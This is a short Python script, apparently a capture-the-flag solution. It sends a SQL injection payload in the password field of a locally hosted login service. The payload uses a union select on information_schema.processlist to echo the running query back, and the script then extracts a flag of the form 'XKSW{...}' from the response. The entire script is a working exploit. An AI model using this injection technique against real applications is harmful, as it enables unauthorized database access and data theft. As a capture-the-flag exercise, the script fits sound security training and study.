from requests import get
from urllib.parse import quote
import re

base_url = 'http://127.0.0.1:26000'

payload = """' union select substr(info FROM POSITION("' union" IN info) FOR length(info)-(position("' union" in info))) from information_schema.processlist -- '"""

res = get(base_url, params={'id':'dummy_user', 'pw':payload})

print(re.findall('XKSW{.*}', res.text)[0])
